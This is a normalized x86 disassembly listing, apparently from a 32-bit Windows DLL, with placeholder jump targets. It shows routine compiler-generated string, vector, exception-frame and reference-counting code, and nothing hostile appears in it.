sub edi eax
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] ax
mov ecx [ ebx ]
lea eax [ esi * 8 ]
sub eax esi
mov esi [ ebx + 0x4 ]
lea edi [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx ebx
call sub_10002460
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] dx
jmp r-xdata
call sub_10001bb0
sub_100021d0
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
sub_10002210
cmp ecx 0x1
jne r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push ecx
movsx ecx dl
push ecx
add eax esi
push eax
call sub_1001b6e0
add esp 0xc
retn
mov eax [ eax ]
mov [ eax + esi ] dl
retn
mov eax [ eax ]
sub_10002240
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_10015cff
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_100024e0
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x10
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
mov [ esi ] 0x0
mov esi [ esi ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_100173b1
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_100183c0
add esp 0xc
sub_100022f0
push ebp
mov ebp esp
push 0xffffffff
push sub_100286f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x0
call sub_10016f5a
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_10017df7
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_10002650
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_1001740d
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_100173b1
mov ecx [ ebp + 0x10 ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_100183c0
mov ecx [ ebp + 0x10 ]
add esp 0xc
sub_1000242f
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_10017df7
int3
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
sub_10002460
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x9249248
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_10015cff
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_100026a0
mov eax esi
cmp eax esi
jae r-xdata
sub_100024e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028610
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_10016f5a
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_10017df7
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_100027b0
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_1001740d
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_100173b1
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_100183c0
add esp 0xc
sub_1000261b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10017df7
int3
mov edx [ esi ]
push edx
call sub_100173b1
add esp 0x4
sub_10002650
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10016f5a
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10017df7
lea eax [ ecx + ecx ]
push eax
call sub_1001740d
add esp 0x4
test eax eax
jne r-xdata
sub_100026a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10029080
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_10015cff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_10002800
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10002ad0
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx * 8 ]
sub edx ebx
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
mov edi [ esi + 0x4 ]
mov eax [ esi ]
call sub_100021d0
mov ecx [ esi ]
push ecx
call sub_100173b1
add esp 0x4
sub_100027b0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10016f5a
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_10017df7
push ecx
call sub_1001740d
add esp 0x4
test eax eax
jne r-xdata
sub_10002800
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10016f5a
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10017df7
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_1001740d
add esp 0x4
test eax eax
jne r-xdata
sub_10002880
push ebp
mov ebp esp
push 0xffffffff
push sub_100286d0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
sar eax 0x1
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp sub_100028f0
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10002240
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_100028f0
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov bl [ eax ]
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
ja r-xdata
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
jbe r-xdata
push r--data
call sub_10015cff
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10015cff
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100024e0
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_1000294d
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10017df7
test edi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov eax [ esi ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp sub_100028f0
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
sub_10002a00
push ebp
mov ebp esp
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_10015cff
mov eax esi
pop ebp
retn 0x4
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10015cff
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100024e0
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
cmp ebx 0x1
jne r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov [ eax ] 0x0
pop edi
pop ebp
retn 0x4
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov dl [ ebp + 0x8 ]
mov eax esi
mov [ eax + ecx ] dl
jmp r-xdata
mov eax [ esi ]
mov dl [ ebp + 0x8 ]
mov [ eax + ecx ] dl
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop ebp
retn 0x4
movsx edx [ ebp + 0x8 ]
push ebx
push edx
add eax ecx
push eax
call sub_1001b6e0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10002ad0
push ebp
mov ebp esp
push 0xffffffff
push sub_10029061
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
lea ecx [ ecx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
cmp esi edi
je r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push edi
push esi
call sub_10017050
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
sub_10002ba0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x14 ]
push edi
call sub_10015dba
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ ebx ] eax
mov [ ebp - 0x1 ] 0x1
mov [ ebp + 0xb ] 0x0
push esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_1001748d
mov al [ ebp + 0xb ]
add esp 0x4
pop esi
test al al
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov edx [ ebx ]
sub edx edi
cmp edx eax
mov ecx [ ebx ]
add ecx edi
cmp eax ecx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
mov eax [ ebx ]
push edi
push eax
mov eax [ ebp - 0x8 ]
push edi
push eax
call sub_10017498
add esp 0x10
test eax eax
sete al
mov [ ebp - 0x1 ] al
test al al
je r-xdata
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi edi
cmp edi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ edx ]
movzx ebx [ ecx ]
sub eax ebx
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
xor edx edx
cmp [ ebp + 0x18 ] dl
setne dl
lea edx [ edx + edx - 0x1 ]
add [ ebx ] edx
jmp r-xdata
mov ebx [ ebp + 0x14 ]
sar eax 0x1f
or eax 0x1
jmp r-xdata
cmp esi 0x1
jbe r-xdata
test eax eax
sete al
mov [ ebp + 0xb ] al
test al al
jne r-xdata
mov ebx [ ebp + 0x14 ]
movzx eax [ edx + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub eax ebx
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub eax ebx
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_10002cd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028514
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
push ebx
mov ecx esi
call sub_100163b9
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
cmp edi ebx
jne r-xdata
push edi
push esi
call sub_100161e0
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] r--data
call sub_10016f5a
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_10017df7
sub_10002d70
push ebp
mov ebp esp
push 0xffffffff
push sub_100284a4
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x4
call sub_1001616d
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_1001750d
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_1001750d
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_1001750d
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_100163e1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_1001750d
add esp 0x4
sub_10002e40
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100163b9
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_100163e1
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10002e70
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_100163e1
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_10002ec0
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10002f10
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10002f40
push ebp
mov ebp esp
lea eax [ ebp - 0x10 ]
sub esp 0x10
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_100167ac
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x10 ] ecx
mov edx [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] edx
call sub_10015e4c
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_10002f90
push ebp
mov ebp esp
push 0xffffffff
push sub_100286ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi ] ebx
jne r-xdata
push 0x20
call sub_1001740d
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
jne r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_10002d70
lea edx [ ebp - 0x34 ]
push edx
mov edi ecx
call sub_10002cd0
mov ebx 0x1
call sub_10002f40
mov edi [ ebp + 0x8 ]
jmp r-xdata
lea ecx [ eax + 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] eax
test bl 0x1
je r-xdata
sub_10003040
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
add ecx 0x8
push ecx
push eax
call sub_1001680c
add esp 0x8
test [ ebp + 0x8 ] ax
mov eax 0x0
setne al
pop ebp
retn 0x8
sub_10003070
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
add ecx 0x8
push ecx
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edx
call sub_10016830
add esp 0x10
pop ebp
retn 0xc
sub_10003090
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
jne r-xdata
sub_100030d0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
je r-xdata
sub_10003130
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001643b
mov [ esi ] ax
add esi 0x2
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10003190
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
